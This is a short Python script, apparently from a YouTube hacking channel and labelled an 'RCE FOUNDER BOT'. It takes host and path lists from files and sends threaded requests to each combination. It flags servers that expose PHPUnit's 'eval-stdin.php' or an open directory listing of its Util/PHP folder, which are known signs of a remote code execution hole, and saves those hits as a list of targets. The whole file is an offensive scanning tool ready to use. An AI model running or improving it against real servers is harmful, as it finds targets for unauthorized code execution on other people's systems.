# requests
# Write By Falcon Digital
# LOCAL FILE DOWNLOAD
# YOUTUBE/FalconDigitalARAB
import requests
import threading
from queue import  Queue
counter = 0
list_url = open("list_url.txt",'r').read().splitlines()
list_url_download = open("list_url_download.txt",'r').read().splitlines()


numberOFthread = int(input("enter Number Of Thread 10-100:"))
print("""

     Falcon Digital ..
     YOUTUBE / FALCON DIGITAL in Arabic ... 
     RCE FOUNDER BOT  ..
     Learn Skills Don't Hurt Anyone .. 

""")



print_lock = threading.Lock()



def attack(q):
    global counter


    counter+=1
    try:
        
        url = q

        r = requests.get(url,timeout=3).text

        if r.find("Index of /vendor/phpunit/phpunit/src/Util/PHP") >=0:
            with open('save.txt','a') as w:
                    print("[+] FOUND URL LFD "+ url)

                    w.write(url+"\n")



        elif r.find("eval-stdin.php") >=0:
            with print_lock:
                print("[+] FOUND URL LFD "+ url)
                with open('save.txt','a') as w:

                    w.write(url+"\n")

        else:
            with print_lock:
                counter+=1
                print('[-] Bad Url :{} Attempts: {}[-]'.format(url,counter), end='\r')


    except Exception as e:
        pass

q = Queue()




def threading1():
    while True:
        q_str = str(q.get())

        attack(q_str)
        q.task_done()
for m in list_url:
    for i in list_url_download:
        url = m + "/=" + i

        if url.find('http') >= 0:
            q.put(url)
        else:
            url ="http://"+ m + "/=" + i
            q.put(url)

    
for x in range(numberOFthread):
    t = threading.Thread(target=threading1)
    t.daemon = True
    t.start()



q.join()
